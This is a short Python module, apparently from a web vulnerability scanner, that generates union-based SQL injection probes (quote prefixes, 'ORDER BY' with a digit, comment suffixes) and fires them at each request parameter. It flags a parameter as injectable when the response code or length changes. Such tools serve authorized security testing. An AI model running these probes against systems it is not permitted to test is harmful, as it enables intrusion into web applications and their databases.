import re, itertools, random, string
from utils.requester import *
from threading import Thread, Semaphore
from config import *


tech = "Union Based SQL Injection"
prefixs = ("'", "\"", "",)
order_by = " ORDER BY "
digits = string.digits
suffixs = ("-- -", "#",)
payloads = []
for pre, digit, suf in itertools.product(prefixs, digits, suffixs):
    payloads.append(f"{pre}{order_by}{digit}{suf}")

def exec(data):
    is_not_first = False
    for pos, payload in itertools.product(POSITIONS, payloads):
        for parameter in data[pos].keys():
            r = single_request(data, pos, parameter, payload)
            if is_not_first:
                if (r.status_code != pre_code) or (len(r.text) != pre_length):
                    print(f"■■■{tech}■■■{pos}■■■{parameter}■■■{payload}■■■")
                    return True
            pre_length, pre_code = len(r.text), r.status_code
            is_not_first = True